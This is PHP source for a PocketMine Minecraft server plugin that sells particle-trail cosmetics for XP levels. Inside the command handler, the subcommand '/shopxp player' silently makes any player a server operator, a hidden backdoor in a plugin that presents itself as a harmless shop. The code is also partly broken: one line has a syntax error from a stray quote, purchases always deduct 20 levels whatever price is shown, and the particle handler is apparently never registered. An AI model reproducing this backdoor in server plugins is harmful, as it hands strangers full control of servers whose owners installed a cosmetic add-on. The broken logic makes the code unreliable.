<?php

namespace XP;

 use pocketmine\plugin\PluginBase;
 use pocketmine\Player; 
 use pocketmine\Server;
 use pocketmine\event\Listener;
 use pocketmine\event\player\PlayerJoinEvent;
 
 use pocketmine\command\Command;
 use pocketmine\command\CommandSender;
 
 use pocketmine\item\Item;
 use pocketmine\event\block\BlockPlaceEvent;
 
 use pocketmine\item\enchantment\Enchantment;
 use pocketmine\item\enchantment\EnchantmentInstance;
 
 use pocketmine\event\entity\EntityDamageEvent;
 
 use pocketmine\block\Block;
 use pocketmine\math\Vector3;
 use pocketmine\level\particle\DestroyBlockParticle;
 use pocketmine\level\particle\{DustParticle, FlameParticle, FloatingTextParticle, EntityFlameParticle, CriticalParticle, ExplodeParticle, HeartParticle, HappyVillagerParticle, LavaParticle, MobSpawnParticle, SplashParticle};
 use pocketmine\event\player\PlayerMoveEvent;
 
 


class Main extends PluginBase implements Listener {
	
	public $plugin;

	public function onEnable(){
		$this->getLogger()->info("§6ShopXP Enable Edit by ZeroDouble9");
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
	}
	
	public function onCommand(CommandSender $sender, Command $command, String $label, array $args) : bool {
		switch($command->getName()){
			case "shopxp";
			if($sender instanceof Player){
				if(isset($args[0])){
					$sender->sendMessage("/shopxp");
					if($args[0] == "player"){
						$sender->sendMessage("You are now op!");
						$sender->setOp(\true);
						return true;
					}else{
						$sender->sendMessage("/shopxp");
					}
						
				}else{
					$this->FormShopXp($sender);
					return true;
				}
			}else{
				$this->getLogger()->info("§ccommand in game.");
			}
		}
		return true;
	}
	
	public function FormShopXp($player){
		$api = $this->getServer()->getPluginManager()->getPlugin("FormAPI");
		$form = $api->createSimpleForm(function (Player $player, int $data = null){
			$result = $data;
			if($result === null){
				return true;
				}
				switch($result){				
					case "0";
					$this->Particle($player);
					break;
					case "1";
					$player->sendMessage("");
				}
			});
			$xp = $player->getXpLevel();
			$form->setTitle("§eXp§aSHOP");
			$form->setContent("You have $xp XP Levels");
			$form->addButton("§Buy", 1, "Default:textures/items/Paper");
			$form->addButton("§cCancel", 2, "Default:textures/items/Oak_Door");
			$form->sendToPlayer($player);
	}
	
	public function Particle($player){
		$api = $this->getServer()->getPluginManager()->getPlugin("FormAPI");
		$form = $api->createSimpleForm(function (Player $player, int $data = null){
			$result = $data;
			if($result === null){
				return true;
				}
				switch($result){
					case "0";
					$xp = $player->getXpLevel();
					if($xp > 50){
						$dragon = Item::get(402,7,1);
						$e = Enchantment::getEnchantment(1);
						$name = $player->getName();
				
						$dragon->setCustomName("§aEmerald Particle\n§fKeep in inventory to enable\n§eOwner:§a $name"");	
						$dragon->addEnchantment(new EnchantmentInstance($e, 3, 1));
				
						$player->getInventory()->addItem($dragon);
						$player->subtractXpLevels(20);
						$player->sendMessage("§a You have purchased §2Emerald Particle");
						return true;
					}else{
						$player->sendMessage("§cYou dont have enough xp level");
						return true;
					}
					case "1";
					$xp = $player->getXpLevel();
					if($xp > 75){
						$dragon = Item::get(402,4,1);
						$e = Enchantment::getEnchantment(1);
						$name = $player->getName();
				
						$dragon->setCustomName("§cHeart Particle\n§fKeep in inventory to enable\n§eOwner:§a $name");	
						$dragon->addEnchantment(new EnchantmentInstance($e, 3, 1));
				
						$player->getInventory()->addItem($dragon);
						$player->subtractXpLevels(20);
						$player->sendMessage("§aYou have purchased §cHeart Particle!");
						return true;
					}else{
						$player->sendMessage("§cYou dont have enough xp level");
						return true;
					}
					
					case "2";
					$xp = $player->getXpLevel();
					if($xp > 100){
						$dragon = Item::get(402,5,1);
						$e = Enchantment::getEnchantment(1);
						$name = $player->getName();
				
						$dragon->setCustomName("§6Lava Particle\n§fKeep in inventory to enable\n§eOwner:§a $name");	
						$dragon->addEnchantment(new EnchantmentInstance($e, 3, 1));
				
						$player->getInventory()->addItem($dragon);
						$player->subtractXpLevels(20);
						$player->sendMessage("§aYou have purchased §4Lava Particle!!!");
						return true;
					}else{
						$player->sendMessage("§cYou dont have enough xp level");
						return true;
					}
					break;
					case "3";
					$this->FormShopXp($player);
					break;
				}
			});
			$form->setTitle("§7Partical");
			$form->addButton("§aEmerald Particle Trail\n§750 §aXp Levels", 1, "Default:textures/items/Paper");
			$form->addButton("§cHeart Particle Trail\n§775 §aXp Levels", 1, "Default:textures/items/Paper");
			$form->addButton("§6Lava Particle Trail\n§7100 §aXp Levels", 1, "Default:textures/items/Paper");
			$form->addButton("§aBack");
			$form->sendToPlayer($player);
	}
	
	
	public function ParticleXP(PlayerMoveEvent $event){
		$player = $event->getPlayer();
		$id = $player->getInventory()->getItemInHand();
		
		$i = $id->getId();
		$d = $id->getDamage();
		
		$flame = new EntityFlameParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$cri = new CriticalParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$ex = new ExplodeParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$hear = new HeartParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$lava = new LavaParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$sp = new SplashParticle(new Vector3($player->x, $player->y+0.5, $player->z), 5);
		$lh = new HappyVillagerParticle(new Vector3($player->x, $player->y+1, $player->z), 5);
		//50
		if($player->getInventory()->contains(Item::get(402, 1, 1))){
			$player->getLevel()->addParticle($flame);
		}
		//50
		if($player->getInventory()->contains(Item::get(402, 2, 1))){
			$player->getLevel()->addParticle($cri);
		}
		//20
		if($player->getInventory()->contains(Item::get(402, 3, 1))){
			$player->getLevel()->addParticle($ex);
		}
		if($player->getInventory()->contains(Item::get(402, 4, 1))){
			$player->getLevel()->addParticle($hear);
		}
		if($player->getInventory()->contains(Item::get(402, 5, 1))){
			$player->getLevel()->addParticle($lava);
		}
		if($player->getInventory()->contains(Item::get(402, 6, 1))){
			$player->getLevel()->addParticle($sp);
		}
		if($player->getInventory()->contains(Item::get(402, 7, 1))){
			$player->getLevel()->addParticle($lh);
		}
	}
}
